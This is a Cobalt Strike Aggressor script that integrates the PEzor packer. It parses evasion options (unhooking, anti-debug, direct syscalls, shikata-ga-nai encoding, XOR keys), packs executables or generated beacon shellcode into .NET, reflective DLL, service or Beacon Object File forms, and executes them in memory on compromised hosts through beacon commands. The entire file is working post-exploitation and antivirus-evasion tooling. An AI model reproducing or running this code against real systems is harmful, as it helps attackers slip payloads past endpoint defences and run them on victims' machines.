include(script_resource("utils.cna"));

debug(34 | 4);

alias execute-PEzor {
    fork(&execute_PEzor, $1 => $0);
}

alias execute-inmemory {
    fork(&execute_inmemory, $1 => $1, $2 => $0);
}

alias generate-payload {
    fork(&generate_payload, $1 => binfo($1, "listener"), $2 => binfo($1, "arch"), $3 => $0);
}

sub execute_PEzor {
    local('$command $match $shellcode $type $executable $sgn $rx $self $debug $32 $64 $sdk $index $unhook $syscalls $cleanup $antidebug $sleep $wait $format $length $end $opts $args $otheropts @argv $tmpdest $handle @output $packed $xorkey');
    $command = $1;

    # manually parse args
    find($command, ' ([\w\/\._][\w\/\.\-_]*)')
    ($match, $type) = matched();
    $executable = copy($match);

    find($command, '(\-sgn)');
    ($match, $type) = matched();
    $sgn = copy($match);

    find($command, '(\-rx)');
    ($match, $type) = matched();
    $rx = copy($match);

    find($command, '(\-self)');
    ($match, $type) = matched();
    $self = copy($match);

    find($command, '(\-sdk)');
    ($match, $type) = matched();
    $sdk = copy($match);

    find($command, '(\-debug)');
    ($match, $type) = matched();
    $debug = copy($match);

    find($command, '(\-32)');
    ($match, $type) = matched();
    $32 = copy($match);

    find($command, '(\-64)');
    ($match, $type) = matched();
    $64 = copy($match);

    find($command, '(\-unhook)');
    ($match, $type) = matched();
    $unhook = copy($match);

    find($command, '(\-antidebug)');
    ($match, $type) = matched();
    $antidebug = copy($match);

    find($command, '(\-syscalls)');
    ($match, $type) = matched();
    $syscalls = copy($match);

    find($command, '(\-cleanup)');
    ($match, $type) = matched();
    $cleanup = copy($match);

    find($command, '(\-shellcode)');
    ($match, $type) = matched();
    $shellcode = copy($match);

    find($command, '\-sleep=(\d*)');
    ($match, $type) = matched();
    $sleep = copy($match);

    find($command, '\-wait=(\d*)');
    ($match, $type) = matched();
    $wait = copy($match);

    find($command, '\-xorkey=([\w\-_]*)');
    ($match, $type) = matched();
    $xorkey = copy($match);

    find($command, '\-format=([\w\-]*)');
    ($match, $type) = matched();
    $format = copy($match);

    $index = indexOf($command, $executable);
    $length = strlen($executable);
    $end = expr("$index + $length");
    $opts = substr($command, $end);

    find($opts, "\-p '(.*)'");
    ($match, $type) = matched();
    $args = copy($match);

    $otheropts = replace($opts, " *\-p ' $+ $args $+ ' *", " ");
    $otheropts = replace($otheropts, '^ *| *$', "");

    if ($wait eq "") {
        $wait = 0;
    }

    if ($format eq "") {
        $format = "dotnet";
    }

    # copy executable to tmp dir
    $tmpdest = copy_to_temp_file($executable);

    # build argv
    push(@argv, "PEzor");

    if ($sgn ne "") {
        push(@argv, $sgn);
    }

    if ($rx ne "") {
        push(@argv, $rx);
    }

    if ($self ne "") {
        push(@argv, $self);
    }

    if ($sdk ne "") {
        push(@argv, $sdk);
    }

    if ($debug ne "") {
        push(@argv, $debug);
    }

    if ($32 ne "") {
        push(@argv, $32);
    }

    if ($64 ne "") {
        push(@argv, $64);
    }

    if ($unhook ne "") {
        push(@argv, $unhook);
    }

    if ($antidebug ne "") {
        push(@argv, $antidebug);
    }

    if ($syscalls ne "") {
        push(@argv, $syscalls);
    }

    if ($cleanup ne "") {
        push(@argv, $cleanup);
    }

    if ($shellcode ne "") {
        push(@argv, $shellcode);
    }

    if ($sleep ne "") {
        push(@argv, "-sleep= $+ $sleep");
    }

    if ($xorkey ne "") {
        push(@argv, "-xorkey= $+ $xorkey");
    }

    if ($format ne "") {
        push(@argv, "-format= $+ $format");
    }

    push(@argv, $tmpdest);

    if ($args ne "") {
        push(@argv, "-p");
        push(@argv, $args);
    }

    println($opts);
    println($otheropts);

    @argv = concat(@argv, split(" ", $otheropts));

    printAll(@argv);

    # execute PEzor
    println("Executing PEzor");
    $handle = fork(&exec_async, \@argv);
    @output = wait($handle);
    closef($handle);
    printAll(@output);

    if ($format eq "exe") {
        $packed = "$tmpdest $+ .packed.exe";
        println("PEzor generated EXE $packed");
        return $packed;
    } else if ($format eq "dll") {
        $packed = "$tmpdest $+ .packed.dll";
        println("PEzor generated DLL $packed");
        return $packed;
    } else if ($format eq "service-dll") {
        $packed = "$tmpdest $+ .packed.service.dll";
        println("PEzor generated service DLL $packed");
        return $packed;
    } else if ($format eq "service-exe") {
        $packed = "$tmpdest $+ .packed.service.exe";
        println("PEzor generated service EXE $packed");
        return $packed;
    } else if ($format eq "reflective-dll") {
        $packed = "$tmpdest $+ .packed.reflective.dll";
        println("PEzor generated reflective DLL $packed");
        return $packed;
    } else if ($format eq "bof") {
        if ($32) {
            $packed = "$tmpdest $+ .packed.x86.o";
        } else {
            $packed = "$tmpdest $+ .packed.x64.o";
        }
        println("PEzor generated Beacon Object File $packed");
        return $packed;
    }  else { # } else if ("dotnet" isin $format) {
        $packed = "$tmpdest $+ .packed.dotnet.exe";
        println("PEzor generated .NET assembly $packed");
        return $packed;
    }
}

sub execute_inmemory {
    local('$beacon $command $match $type $executable $format $wait $args $packed $wait');
    $beacon = $1;
    $command = $2;

    # manually parse args
    #find($command, ' ([\w\/\.]*) ')
    find($command, ' ([\w\/\._][\w\/\.\-_]*)')
    ($match, $type) = matched();
    $executable = copy($match);

    find($command, '\-format=([\w\-]*)');
    ($match, $type) = matched();
    $format = copy($match);

    find($command, '\-wait=(\d*)');
    ($match, $type) = matched();
    $wait = copy($match);

    find($command, "\-p '(.*)'");
    ($match, $type) = matched();
    $args = copy($match);

    # validation
    if (($format ne "") && ("dotnet" !isin $format) && ($format ne "reflective-dll") && ($format ne "bof")) {
        berror($beacon, "Format $format is not supported, use -format=reflective-dll or -format=dotnet or -format=bof");
        return;
    }

    if ($format eq "bof") {
        $command = "$command -t";
        if (binfo($beacon, "arch") eq "x64") {
            #$command = "$command -64";
        } else {
            #$command = "$command -32";
        }
    }

    if ($wait eq "") {
        $wait = 0;
    }

    if ($format eq "") {
        $format = "dotnet";
    }

    # announce task
    btask($beacon, "Tasked beacon to execute in-memory $executable with args: $args");

    println("Executing PEzor $command");
    $packed = execute_PEzor($command);

    if (("dotnet" isin $format) || ($format eq "")) {
        blog($beacon, "PEzor generated .NET assembly $packed");
        println("Executing generated .NET assembly: $packed");

        # call execute-assembly
        bexecute_assembly($beacon, $packed);
    } else if ($format eq "bof") {
        blog($beacon, "PEzor generated Beacon Object File $packed");
        println("Executing generated Beacon Object File: $packed");

        # call execute-assembly
        binline_execute($beacon, $packed);
    } else {
        blog($beacon, "PEzor generated reflective DLL $packed");
        println("Executing generated reflective DLL: $packed");

        # call dllspawn
        bdllspawn($beacon, $packed, $null, "Reflective DLL: $executable", expr("$wait * 1000"), true);
    }
}

sub generate_raw_payload {
    local('$handler $arch $payload $tmpfile');
    $handler = $1;
    $arch = $2;
    $payload = artifact_payload($handler, "raw", $arch);
    $tmpfile = get_random_temp_filename();
    write_file($tmpfile, $payload);
    return $tmpfile;
}

sub generate_payload {
    local('$listener $arch $command $raw $packed');
    $listener = $1;
    $arch = $2;
    $command = $3;
    println("PEzor will generate payload for $listener");
    $raw = generate_raw_payload($listener, $arch);

    if ($arch eq "x64") {
        $raw = "-64 $raw";
    } else {
        $raw = "-32 $raw";
    }

    if ("generate-payload" isin $command) {
        println("executing " . substr($command, 17) . " $raw");
        $packed = execute_PEzor(substr($command, 17) . " $raw");
    } else {
        println("executing $command $raw");
        $packed = execute_PEzor("$command $raw");
    }

    println("PEzor generated $packed");
    return $packed;
}
